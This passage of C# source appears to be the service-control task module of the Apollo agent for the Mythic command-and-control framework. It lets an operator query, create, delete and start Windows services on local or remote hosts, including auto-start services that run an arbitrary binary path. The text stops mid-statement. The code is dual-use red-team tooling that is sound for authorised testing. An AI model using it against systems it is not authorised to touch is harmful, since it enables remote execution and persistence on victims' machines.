#define COMMAND_NAME_UPPER

#if DEBUG
#define SC
#endif

#if SC

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Permissions;
using System.Text;
using ST = System.Threading.Tasks;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;

namespace Tasks
{
    public class sc : Tasking
    {
        #region typedefs

        [DataContract]
        internal struct ScParameters
        {
            [DataMember(Name = "query")]
            public bool Query;
            [DataMember(Name = "start")]
            public bool Start;
            [DataMember(Name = "stop")]
            public bool Stop;
            [DataMember(Name = "create")]
            public bool Create;
            [DataMember(Name = "delete")]
            public bool Delete;
            [DataMember(Name = "modify")]
            public bool Modify;
            [DataMember(Name = "computer")]
            public string Computer;
            [DataMember(Name = "service")]
            public string Service;
            [DataMember(Name = "display_name")]
            public string DisplayName;
            [DataMember(Name = "binpath")]
            public string Binpath;
        }

        [DataContract]
        internal struct ServiceResult
        {
            [DataMember(Name = "display_name")]
            public string DisplayName;
            [DataMember(Name = "service")]
            public string Service;
            [DataMember(Name = "status")]
            public string Status;
            [DataMember(Name = "can_stop")]
            public bool CanStop;
            [DataMember(Name = "dependencies")]
            public string[] Dependencies;
            [DataMember(Name = "service_type")]
            public string ServiceType;
            [DataMember(Name = "start_type")]
            public string StartType;
            [DataMember(Name = "description")]
            public string Description;
            [DataMember(Name = "computer")] 
            public string Computer;
            [DataMember(Name = "binary_path")] 
            public string BinaryPath;
            [DataMember(Name = "load_order_group")] 
            public string LoadOrderGroup;
            [DataMember(Name = "run_as")] 
            public string RunAs;
            [DataMember(Name = "tag_id")] 
            public string ErrorControl;
            [DataMember(Name = "pid")] 
            public string PID;
            [DataMember(Name = "accepted_controls")] 
            public string[] AcceptedControls;
            
        }

        public struct ServiceInfo
        {
            public uint ServiceType;
            public uint StartType;
            public uint ErrorControl;
            public string BinaryPathName;
            public string LoadOrderGroup;
            public int TagId;
            public string Dependencies;
            public string StartName;
            public string DisplayName;
            public IntPtr ServiceHandle;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct QUERY_SERVICE_CONFIG
        {
            public uint ServiceType;
            public uint StartType;
            public ServiceErrorControl ErrorControl;
            public IntPtr BinaryPathName;
            public IntPtr LoadOrderGroup;
            public int TagID;
            public IntPtr Dependencies;
            public IntPtr StartName;
            public IntPtr DisplayName;
        }
        
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct ServiceStatus
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(ServiceStatus));
            public ServiceType dwServiceType;
            public SERVICE_STATE dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_STATUS_PROCESS
        {
            public int serviceType;
            public int currentState;
            public int controlsAccepted;
            public int win32ExitCode;
            public int serviceSpecificExitCode;
            public int checkPoint;
            public int waitHint;
            public int processId;
            public int serviceFlags;
        }
        
        
        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct ENUM_SERVICE_STATUS_PROCESS
        {
            internal static readonly int SizePack4 = Marshal.SizeOf(typeof(ENUM_SERVICE_STATUS_PROCESS));

            /// <summary>
            /// sizeof(ENUM_SERVICE_STATUS_PROCESS) allow Packing of 8 on 64 bit machines
            /// </summary>
            internal static readonly int SizePack8 = Marshal.SizeOf(typeof(ENUM_SERVICE_STATUS_PROCESS)) + 4;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            internal string pServiceName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            internal string pDisplayName;
            internal SERVICE_STATUS_PROCESS ServiceStatus;
        }
        
        [StructLayout( LayoutKind.Sequential )]
        public class SERVICE_DESCRIPTION
        {
            [MarshalAs( System.Runtime.InteropServices.UnmanagedType.LPWStr )]
            public String lpDescription;
        }
        
        #endregion

        #region enums
        [Flags]
        public enum AccessMask : uint
        {
            DELETE = 0x00010000,

            READ_CONTROL = 0x00020000,

            WRITE_DAC = 0x00040000,

            WRITE_OWNER = 0x00080000,

            SYNCHRONIZE = 0x00100000,

            STANDARD_RIGHTS_REQUIRED = 0x000F0000,

            STANDARD_RIGHTS_READ = 0x00020000,

            STANDARD_RIGHTS_WRITE = 0x00020000,

            STANDARD_RIGHTS_EXECUTE = 0x00020000,

            STANDARD_RIGHTS_ALL = 0x001F0000,

            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

            ACCESS_SYSTEM_SECURITY = 0x01000000,

            MAXIMUM_ALLOWED = 0x02000000,

            GENERIC_READ = 0x80000000,

            GENERIC_WRITE = 0x40000000,

            GENERIC_EXECUTE = 0x20000000,

            GENERIC_ALL = 0x10000000,

            DESKTOP_READOBJECTS = 0x00000001,

            DESKTOP_CREATEWINDOW = 0x00000002,

            DESKTOP_CREATEMENU = 0x00000004,

            DESKTOP_HOOKCONTROL = 0x00000008,

            DESKTOP_JOURNALRECORD = 0x00000010,

            DESKTOP_JOURNALPLAYBACK = 0x00000020,

            DESKTOP_ENUMERATE = 0x00000040,

            DESKTOP_WRITEOBJECTS = 0x00000080,

            DESKTOP_SWITCHDESKTOP = 0x00000100,

            WINSTA_ENUMDESKTOPS = 0x00000001,

            WINSTA_READATTRIBUTES = 0x00000002,

            WINSTA_ACCESSCLIPBOARD = 0x00000004,

            WINSTA_CREATEDESKTOP = 0x00000008,

            WINSTA_WRITEATTRIBUTES = 0x00000010,

            WINSTA_ACCESSGLOBALATOMS = 0x00000020,

            WINSTA_EXITWINDOWS = 0x00000040,

            WINSTA_ENUMERATE = 0x00000100,

            WINSTA_READSCREEN = 0x00000200,

            WINSTA_ALL_ACCESS = 0x0000037F
        }
        
        [Flags]
        public enum SCMAccess : uint
        {
            /// <summary>
            /// Required to connect to the service control manager.
            /// </summary>
            SC_MANAGER_CONNECT = 0x00001,

            /// <summary>
            /// Required to call the CreateService function to create a service
            /// object and add it to the database.
            /// </summary>
            SC_MANAGER_CREATE_SERVICE = 0x00002,

            /// <summary>
            /// Required to call the EnumServicesStatusEx function to list the 
            /// services that are in the database.
            /// </summary>
            SC_MANAGER_ENUMERATE_SERVICE = 0x00004,

            /// <summary>
            /// Required to call the LockServiceDatabase function to acquire a 
            /// lock on the database.
            /// </summary>
            SC_MANAGER_LOCK = 0x00008,

            /// <summary>
            /// Required to call the QueryServiceLockStatus function to retrieve 
            /// the lock status information for the database.
            /// </summary>
            SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,

            /// <summary>
            /// Required to call the NotifyBootConfigStatus function.
            /// </summary>
            SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,

            /// <summary>
            /// Includes STANDARD_RIGHTS_REQUIRED, in addition to all access 
            /// rights in this table.
            /// </summary>
            SC_MANAGER_ALL_ACCESS =
                AccessMask.STANDARD_RIGHTS_REQUIRED | SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_LOCK | SC_MANAGER_QUERY_LOCK_STATUS
                | SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_READ = AccessMask.STANDARD_RIGHTS_READ | SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_QUERY_LOCK_STATUS,

            GENERIC_WRITE = AccessMask.STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG,

            GENERIC_EXECUTE = AccessMask.STANDARD_RIGHTS_EXECUTE | SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

            GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
        }

        [Flags]
        public enum ServiceControl : uint
        {
            STOP = 0x00000001,

            PAUSE = 0x00000002,

            CONTINUE = 0x00000003,

            INTERROGATE = 0x00000004,

            SHUTDOWN = 0x00000005,

            PARAMCHANGE = 0x00000006,

            NETBINDADD = 0x00000007,

            NETBINDREMOVE = 0x00000008,

            NETBINDENABLE = 0x00000009,

            NETBINDDISABLE = 0x0000000A,

            DEVICEEVENT = 0x0000000B,

            HARDWAREPROFILECHANGE = 0x0000000C,

            POWEREVENT = 0x0000000D,

            SESSIONCHANGE = 0x0000000E
        }

        [Flags]
        public enum ServiceAccess : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,

            SERVICE_QUERY_CONFIG = 0x00001,

            SERVICE_CHANGE_CONFIG = 0x00002,

            SERVICE_QUERY_STATUS = 0x00004,

            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,

            SERVICE_START = 0x00010,

            SERVICE_STOP = 0x00020,

            SERVICE_PAUSE_CONTINUE = 0x00040,

            SERVICE_INTERROGATE = 0x00080,

            SERVICE_USER_DEFINED_CONTROL = 0x00100,

            SERVICE_ALL_ACCESS =
                (STANDARD_RIGHTS_REQUIRED | SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_START | SERVICE_STOP | SERVICE_PAUSE_CONTINUE
                 | SERVICE_INTERROGATE | SERVICE_USER_DEFINED_CONTROL)
        }
        
        [Flags]
        public enum ServiceType {
            SERVICE_KERNEL_DRIVER = 0x1, 
            SERVICE_FILE_SYSTEM_DRIVER = 0x2, 
            SERVICE_WIN32_OWN_PROCESS = 0x10, 
            SERVICE_WIN32_SHARE_PROCESS = 0x20, 
            SERVICE_INTERACTIVE_PROCESS = 0x100, 
            SERVICETYPE_NO_CHANGE = 0x0, 
            SERVICE_WIN32 = (SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS)
        }

        public enum ServiceErrorControl : int
        {
            /// <summary>
            /// The startup program logs the error in the event log, if possible. If the last-known-good configuration is being started, the startup operation fails. Otherwise, the system is restarted with the last-known good configuration.
            /// </summary>
            SERVICE_ERROR_CRITICAL = 0x00000003,

            /// <summary>
            /// The startup program ignores the error and continues the startup operation.
            /// </summary>
            SERVICE_ERROR_IGNORE = 0x00000000,

            /// <summary>
            /// The startup program logs the error in the event log but continues the startup operation.
            /// </summary>
            SERVICE_ERROR_NORMAL = 0x00000001,

            /// <summary>
            /// The startup program logs the error in the event log. If the last-known-good configuration is being started, the startup operation continues. Otherwise, the system is restarted with the last-known-good configuration.
            /// </summary>
            SERVICE_ERROR_SEVERE = 0x00000002,
        }

        public enum ServiceStartType : int
        {
            /// <summary>
            /// A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services.
            /// </summary>
            SERVICE_AUTO_START = 0x00000002,

            /// <summary>
            /// A device driver started by the system loader. This value is valid only for driver services.
            /// </summary>
            SERVICE_BOOT_START = 0x00000000,

            /// <summary>
            /// A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand.
            /// </summary>
            SERVICE_DEMAND_START = 0x00000003,

            /// <summary>
            /// A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED.
            /// </summary>
            SERVICE_DISABLED = 0x00000004,

            /// <summary>
            /// A device driver started by the IoInitSystem function. This value is valid only for driver services.
            /// </summary>
            SERVICE_SYSTEM_START = 0x00000001

        }

        public enum SERVICE_STATE : uint
        {
            SERVICE_STOPPED = 0x00000001,

            SERVICE_START_PENDING = 0x00000002,

            SERVICE_STOP_PENDING = 0x00000003,

            SERVICE_RUNNING = 0x00000004,

            SERVICE_CONTINUE_PENDING = 0x00000005,

            SERVICE_PAUSE_PENDING = 0x00000006,

            SERVICE_PAUSED = 0x00000007
        }

        public enum ServiceInfoLevel {
            SC_ENUM_PROCESS_INFO = 0,
            SC_STATUS_PROCESS_INFO = 0
        }
        
        public enum ServiceStateRequest {
            SERVICE_ACTIVE = 0x1, 
            SERVICE_INACTIVE = 0x2, 
            SERVICE_STATE_ALL = (SERVICE_ACTIVE | SERVICE_INACTIVE)
        }

        public enum ConfigInfoLevel {
            SERVICE_CONFIG_DESCRIPTION = 0x01,
            SERVICE_CONFIG_FAILURE_ACTIONS = 0x02,
            SERVICE_CONFIG_DELAYED_AUTO_START_INFO = 0x03,
            SERVICE_CONFIG_FAILURE_ACTIONS_FLAG = 0x04,
            SERVICE_CONFIG_SERVICE_SID_INFO = 0x05,
            SERVICE_CONFIG_REQUIRED_PRIVILEGES_INFO = 0x06,
            SERVICE_CONFIG_PRESHUTDOWN_INFO = 0x07,
            SERVICE_CONFIG_PREFERRED_NODE = 0x09,
            SERVICE_CONFIG_TRIGGER_INFO = 0x08,
            SERVICE_CONFIG_LAUNCH_PROTECTED = 0x0C
        }
        
        [Flags]
        internal enum ServiceState : int
        {
            SERVICE_CONTINUE_PENDING= 0x00000005,
            SERVICE_PAUSE_PENDING   = 0x00000006,
            SERVICE_PAUSED      = 0x00000007,
            SERVICE_RUNNING     = 0x00000004,
            SERVICE_START_PENDING   = 0x00000002,
            SERVICE_STOP_PENDING    = 0x00000003,
            SERVICE_STOPPED     = 0x00000001
        }
        
        [Flags]
        internal enum CONTROLS_ACCEPTED : int
        {
            SERVICE_ACCEPT_NETBINDCHANGE = 0x00000010,
            SERVICE_ACCEPT_PARAMCHANGE = 0x00000008,
            SERVICE_ACCEPT_PAUSE_CONTINUE = 0x00000002,
            SERVICE_ACCEPT_PRESHUTDOWN = 0x00000100,
            SERVICE_ACCEPT_SHUTDOWN = 0x00000004,
            SERVICE_ACCEPT_STOP = 0x00000001,

            // supported only by HandlerEx
            SERVICE_ACCEPT_HARDWAREPROFILECHANGE = 0x00000020,
            SERVICE_ACCEPT_POWEREVENT = 0x00000040,
            SERVICE_ACCEPT_SESSIONCHANGE = 0x00000080,
            SERVICE_ACCEPT_TIMECHANGE = 0x00000200,
            SERVICE_ACCEPT_TRIGGEREVENT = 0x00000400,
            SERVICE_ACCEPT_USERMODEREBOOT = 0x00000800,
        }
        #endregion
        
        #region Delegates
        
        private delegate bool CloseServiceHandle(IntPtr hService);
        private static CloseServiceHandle _pCloseServiceHandle = null;

        private delegate IntPtr OpenSCManager(string lpMachineName, string lpSCDB, SCMAccess scParameter);
        private static OpenSCManager _pOpenSCManager = null;
        
        private delegate IntPtr CreateService(
            IntPtr serviceControlManagerHandle,
            string lpSvcName,
            string lpDisplayName,
            ServiceAccess dwDesiredAccess,
            ServiceType dwServiceType,
            ServiceStartType dwStartType,
            ServiceErrorControl dwErrorControl,
            string lpPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);
        private static CreateService _pCreateService = null;

        private delegate bool ControlService(IntPtr hService, ServiceControl dwControl, ref ServiceStatus lpServiceStatus);
        private static ControlService _pControlService = null;

        private delegate int StartService(ServiceControlHandle serviceHandle, int dwNumServiceArgs, string lpServiceArgVectors);
        private static StartService _pStartService = null;
        
        private delegate IntPtr OpenService(IntPtr hSCManager, string lpServiceName, ServiceAccess dwDesiredAccess);
        private static OpenService _pOpenService = null;
        
        private delegate int DeleteService(IntPtr hServiceControl);
        private static DeleteService _pDeleteService = null;
        
        private delegate bool QueryServiceConfig2(
            IntPtr hService, 
            ConfigInfoLevel dwInfoLevel, 
            IntPtr buffer, 
            uint cbBufSize, 
            out uint pcbBytesNeeded);
        private static QueryServiceConfig2 _pQueryServiceConfig2 = null;
        
        private delegate bool QueryServiceConfig(
            IntPtr hService,
            IntPtr intPtrQueryConfig,
            uint cbBufSize,
            out uint pcbBytesNeeded);
        private static QueryServiceConfig _pQueryServiceConfig = null;

        private delegate bool EnumServicesStatusEx(
            IntPtr hSCManager,
            ServiceInfoLevel infoLevel, 
            int dwServiceType,
            int dwServiceState, 
            IntPtr lpServices, 
            uint cbBufSize,
            out uint pcbBytesNeeded, 
            out uint lpServicesReturned,
            ref uint lpResumeHandle, 
            string pszGroupName);
        private static EnumServicesStatusEx _pEnumServicesStatusEx = null;
        
        #endregion

        private static bool InstallService(string hostname, string ServiceName, string ServiceDisplayName, string ServiceEXE)
        {
            try
            {
                UninstallService(hostname, ServiceName);
            }
            catch (Exception ex) { }
            // Console.WriteLine("[*] Attempting to create service {0} on {1}...", ServiceName, hostname);
            IntPtr scmHandle = _pOpenSCManager(hostname, null, SCMAccess.SC_MANAGER_CREATE_SERVICE);
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception($"Failed to open SCM: {new Win32Exception().Message}");
            }

            IntPtr serviceHandle = _pCreateService(
                scmHandle,
                ServiceName,
                ServiceDisplayName,
                ServiceAccess.SERVICE_ALL_ACCESS,
                ServiceType.SERVICE_WIN32_OWN_PROCESS,
                ServiceStartType.SERVICE_AUTO_START,
                ServiceErrorControl.SERVICE_ERROR_NORMAL,
                ServiceEXE,
                null,
                IntPtr.Zero,
                null,
                null,
                null);
            
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"ServiceHandle is invalid: {new Win32Exception().Message}");
            }
            
            _pCloseServiceHandle(scmHandle);
            _pCloseServiceHandle(serviceHandle);
            return true;
        }
        private static bool UninstallService(string hostname, string ServiceName) {
            IntPtr scmHandle = _pOpenSCManager(hostname, null, SCMAccess.SC_MANAGER_CREATE_SERVICE);
            
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception($"Failed to open SCM: {new Win32Exception().Message}");
            }

            IntPtr serviceHandle = _pOpenService(scmHandle, ServiceName, ServiceAccess.SERVICE_ALL_ACCESS);
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"ServiceHandle is invalid: {new Win32Exception().Message}");
            }

            _pDeleteService(serviceHandle);
            _pCloseServiceHandle(scmHandle);
            _pCloseServiceHandle(serviceHandle);
            return true;
        }
        
        public sc(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            if (_pDeleteService == null)
            {
                _pDeleteService = _agent.GetApi().GetLibraryFunction<DeleteService>(Library.ADVAPI32, "DeleteService");
            }
            if (_pOpenService == null)
            {
                _pOpenService = _agent.GetApi().GetLibraryFunction<OpenService>(Library.ADVAPI32, "OpenServiceA");
            }
            if (_pStartService == null)
            {
                _pStartService = _agent.GetApi().GetLibraryFunction<StartService>(Library.ADVAPI32, "StartServiceA");
            }
            if (_pCloseServiceHandle == null)
            {
                _pCloseServiceHandle = _agent.GetApi().GetLibraryFunction<CloseServiceHandle>(Library.ADVAPI32, "CloseServiceHandle");
            }
            if (_pOpenSCManager == null)
            {
                _pOpenSCManager = _agent.GetApi().GetLibraryFunction<OpenSCManager>(Library.ADVAPI32, "OpenSCManagerA");
            }
            if (_pCreateService == null)
            {
                _pCreateService = _agent.GetApi().GetLibraryFunction<CreateService>(Library.ADVAPI32, "CreateServiceA");
            }
            if (_pControlService == null)
            {
                _pControlService = _agent.GetApi().GetLibraryFunction<ControlService>(Library.ADVAPI32, "ControlService");
            }
            if (_pEnumServicesStatusEx == null)
            {
                _pEnumServicesStatusEx = _agent.GetApi().GetLibraryFunction<EnumServicesStatusEx>(Library.ADVAPI32, "EnumServicesStatusExW");
            }
            if (_pQueryServiceConfig2 == null) 
            {
                _pQueryServiceConfig2 = _agent.GetApi().GetLibraryFunction<QueryServiceConfig2>(Library.ADVAPI32, "QueryServiceConfig2W");
            }
            if (_pQueryServiceConfig == null) 
            {
                _pQueryServiceConfig = _agent.GetApi().GetLibraryFunction<QueryServiceConfig>(Library.ADVAPI32, "QueryServiceConfigW");
            }
            if (_pQueryServiceConfig2 == null) 
            {
                _pQueryServiceConfig2 = _agent.GetApi().GetLibraryFunction<QueryServiceConfig2>(Library.ADVAPI32, "QueryServiceConfig2W");
            }
        }
        
        [SecurityPermission(SecurityAction.InheritanceDemand, UnmanagedCode = true)]
        [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
        public class ServiceControlHandle : SafeHandleZeroOrMinusOneIsInvalid
        {
            // Create a SafeHandle, informing the base class 
            // that this SafeHandle instance "owns" the handle,
            // and therefore SafeHandle should call 
            // our ReleaseHandle method when the SafeHandle 
            // is no longer in use.
            private ServiceControlHandle()
                : base(true)
            {
            }

            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
            protected override bool ReleaseHandle() {
                // Here, we must obey all rules for constrained execution regions. 
                return _pCloseServiceHandle(this.handle);
                // If ReleaseHandle failed, it can be reported via the 
                // "releaseHandleFailed" managed debugging assistant (MDA).  This
                // MDA is disabled by default, but can be enabled in a debugger 
                // or during testing to diagnose handle corruption problems. 
                // We do not throw an exception because most code could not recover 
                // from the problem.
            }
        }

        private void ValidateParameters(ScParameters args)
        {
            if (args.Start)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Start action requires service name to start.");
                }
            } else if (args.Stop)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Stop action requires service name to stop.");
                }
            } else if (args.Query)
            {
                
            } else if (args.Create)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Create action requires service name to create.");
                } else if (string.IsNullOrEmpty(args.Binpath))
                {
                    throw new Exception("Create action requires binpath to new service binary.");
                }
            } else if (args.Delete)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Delete action requires service name to delete.");
                }
            }
            else if (args.Modify)
            {
                if (string.IsNullOrEmpty(args.Service))
                {
                    throw new Exception("Modify action requires service name to create.");
                } else if (string.IsNullOrEmpty(args.Binpath) && string.IsNullOrEmpty(args.DisplayName))
                {
                    throw new Exception("Modify action requires parameter to modify.");
                }
            } 
            else
            {
                throw new Exception("No valid action given for sc.");
            }
        }

        private static ENUM_SERVICE_STATUS_PROCESS[] GetServiceStatuses(IntPtr buf, uint iServicesReturned) {
            ENUM_SERVICE_STATUS_PROCESS serviceStatus;
            List<ENUM_SERVICE_STATUS_PROCESS> services = new List<ENUM_SERVICE_STATUS_PROCESS>();

            // check if 64 bit system which has different pack sizes
            if (IntPtr.Size == 8)
            {
                long pointer = buf.ToInt64();
                for (int i = 0; i < (int)iServicesReturned; i++)
                {
                    serviceStatus = (ENUM_SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(new IntPtr(pointer),
                        typeof(ENUM_SERVICE_STATUS_PROCESS));
                    services.Add(serviceStatus);
                        
                    // increment by sizeof(ENUM_SERVICE_STATUS_PROCESS) allow Packing of 8
                    pointer += ENUM_SERVICE_STATUS_PROCESS.SizePack8; 
                }
            } else { 
                int pointer = buf.ToInt32(); 
                for (int i = 0; i < (int)iServicesReturned; i++) {
                        
                    serviceStatus = (ENUM_SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(new IntPtr(pointer), 
                        typeof(ENUM_SERVICE_STATUS_PROCESS)); 
                    services.Add(serviceStatus);

                    // increment by sizeof(ENUM_SERVICE_STATUS_PROCESS) allow Packing of 4
                    pointer += ENUM_SERVICE_STATUS_PROCESS.SizePack4; 
                } 
            }
            
            return services.ToArray();
        }
                
        private static string ReportDescription(IntPtr serviceHandle)
        {
            // Determine the buffer size needed
            _pQueryServiceConfig2(serviceHandle, ConfigInfoLevel.SERVICE_CONFIG_DESCRIPTION, IntPtr.Zero, 0, out uint dwBytesNeeded);

            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bool success = _pQueryServiceConfig2(serviceHandle, ConfigInfoLevel.SERVICE_CONFIG_DESCRIPTION, ptr, dwBytesNeeded, out dwBytesNeeded);
            if (!success) {
                return null;
            }

            SERVICE_DESCRIPTION descriptionStruct = new SERVICE_DESCRIPTION();
            Marshal.PtrToStructure( ptr, descriptionStruct );
            
            if (ptr != IntPtr.Zero)
                Marshal.FreeHGlobal( ptr );

            return descriptionStruct.lpDescription;
        }
        
        private static QUERY_SERVICE_CONFIG GetServiceConfig(IntPtr serviceHandle) {
            IntPtr qscPtr = IntPtr.Zero;

            bool retCode = _pQueryServiceConfig(serviceHandle, qscPtr, 0, out uint bytesNeeded);
            
            if (!retCode && bytesNeeded == 0)
            {
                throw new Win32Exception();
            }

            qscPtr = Marshal.AllocCoTaskMem((int)bytesNeeded);
            retCode = _pQueryServiceConfig(serviceHandle, qscPtr, bytesNeeded, out bytesNeeded);
            if (!retCode)
            {
                throw new Win32Exception();
            }

            return (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(qscPtr, typeof(QUERY_SERVICE_CONFIG));
        }

        public override void Start()
        {
            TaskResponse resp;
            ScParameters parameters = _jsonSerializer.Deserialize<ScParameters>(_data.Parameters);
            if (string.IsNullOrEmpty(parameters.Computer))
            {
                parameters.Computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
            }

            ValidateParameters(parameters);
            List<ServiceResult> results = new List<ServiceResult>();
            
            if (parameters.Query)
            {
                IntPtr buf = IntPtr.Zero;
                IntPtr serviceHandle = IntPtr.Zero;
                IntPtr serviceMangerHandle = IntPtr.Zero;
                uint iResumeHandle = 0;
                
                try {
                    serviceMangerHandle = _pOpenSCManager(null, null, SCMAccess.SC_MANAGER_ALL_ACCESS);

                    if (serviceMangerHandle == IntPtr.Zero)
                        throw new Exception($"Failed to open SCM: {new Win32Exception().Message}");

                    bool result = _pEnumServicesStatusEx(
                        serviceMangerHandle,
                        ServiceInfoLevel.SC_ENUM_PROCESS_INFO,
                        (int) ServiceType.SERVICE_WIN32,
                        (int) ServiceStateRequest.SERVICE_STATE_ALL,
                        IntPtr.Zero,
                        0,
                        out uint iBytesNeeded,
                        out uint iServicesReturned,
                        ref iResumeHandle, 
                        null);

                    if (!result) {
                        // allocate our memory to receive the data for all the services (including the names)
                        buf = Marshal.AllocHGlobal((int) iBytesNeeded);

                        result = _pEnumServicesStatusEx(
                            serviceMangerHandle,
                            ServiceInfoLevel.SC_ENUM_PROCESS_INFO,
                            (int) ServiceType.SERVICE_WIN32,
                            (int) ServiceStateRequest.SERVICE_STATE_ALL,
                            buf,
                            iBytesNeeded,
                            out iBytesNeeded,
                            out iServicesReturned,
                            ref iResumeHandle,
                            null);
                    }

                    if (!result)
                        throw new Exception($"Unable to enumerate services: {new Win32Exception().Message}");

                    ENUM_SERVICE_STATUS_PROCESS[] serviceArray = GetServiceStatuses(buf, iServicesReturned);

                    foreach (ENUM_SERVICE_STATUS_PROCESS service in serviceArray) {

                        serviceHandle = _pOpenService( serviceMangerHandle, service.pServiceName, ServiceAccess.SERVICE_QUERY_CONFIG );
                        if (serviceHandle == IntPtr.Zero)
                            throw new ExternalException( $"Error OpenService: {new Win32Exception()}" );
                        
                        QUERY_SERVICE_CONFIG qsc = GetServiceConfig(serviceHandle);
                        TextInfo textInfo = new CultureInfo("en-US", false).TextInfo;
                        
                        ServiceResult svc = new ServiceResult {
                            Computer = parameters.Computer,
                            Description = ReportDescription(serviceHandle),
                            Service = service.pServiceName,
                            DisplayName = service.pDisplayName,
                            BinaryPath = Marshal.PtrToStringAuto(qsc.BinaryPathName),
                            LoadOrderGroup = Marshal.PtrToStringAuto(qsc.LoadOrderGroup),
                            RunAs = Marshal.PtrToStringAuto(qsc.StartName),
                            Dependencies = Marshal.PtrToStringAuto(qsc.Dependencies)?.Split(','),
                            ServiceType = Convert.ToString((ServiceType)service.ServiceStatus.serviceType),
                            Status = textInfo.ToTitleCase(Convert.ToString((ServiceState)service.ServiceStatus.currentState).Replace("SERVICE_", "").ToLower()).Replace("_", ""),
                            PID = Convert.ToString(service.ServiceStatus.processId),
                            AcceptedControls = Convert.ToString((CONTROLS_ACCEPTED)service.ServiceStatus.controlsAccepted).Split(','),
                            CanStop = false,
                            StartType = Convert.ToString((ServiceStartMode)qsc.StartType),
                            ErrorControl = qsc.ErrorControl.ToString(),
                        };

                        if (svc.AcceptedControls.Contains("SERVICE_ACCEPT_STOP"))
                            svc.CanStop = true;

                        results.Add(svc);
                        
                        if (serviceHandle != IntPtr.Zero)
                            _pCloseServiceHandle(serviceHandle);
                    }
                    resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);

                }
                catch(Exception ex) 
                {
                    resp = CreateTaskResponse($"Failed to enumerate services on {parameters.Computer}. Reason: {ex.Message}",
                        true, "error");
                }
                finally 
                { 
                    if (serviceMangerHandle != IntPtr.Zero) 
                        _pCloseServiceHandle(serviceMangerHandle);
                    if (buf != IntPtr.Zero) 
                        Marshal.FreeHGlobal(buf);
                }
            }
            else if (parameters.Create)
            {
                try
                {
                    if (InstallService(parameters.Computer, parameters.Service, parameters.DisplayName, parameters.Binpath))
                    {
                        ServiceController createdService = new ServiceController(parameters.Service, parameters.Computer);
                        results.Add(new ServiceResult
                        {
                            DisplayName = createdService.DisplayName,
                            Service = createdService.ServiceName,
                            Status = createdService.Status.ToString(),
                            CanStop = createdService.CanStop,
                            Computer = parameters.Computer
                        });
                        resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                    }
                    else
                    {
                        resp = CreateTaskResponse("Failed to create service.", true, "error");
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Failed to create service. Reason: {ex.Message}", true, "error");
                }
            }
            else if (parameters.Delete)
            {
                try
                {
                    if (UninstallService(parameters.Computer, parameters.Service))
                    {
                        resp = CreateTaskResponse($"Deleted service {parameters.Service} from {parameters.Computer}", true);
                    }
                    else
                    {
                        resp = CreateTaskResponse("Failed to delete service.", true, "error");
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse(
                        $"Failed to delete service. Reason: {ex.Message}", true, "error");
                }
            }
            else if (parameters.Start)
            {
                try
                {
                    ServiceController instance = new ServiceController(parameters.Service, parameters.Computer);
                    if (instance.Status == ServiceControllerStatus.Running ||
                        instance.Status == ServiceControllerStatus.StartPending)
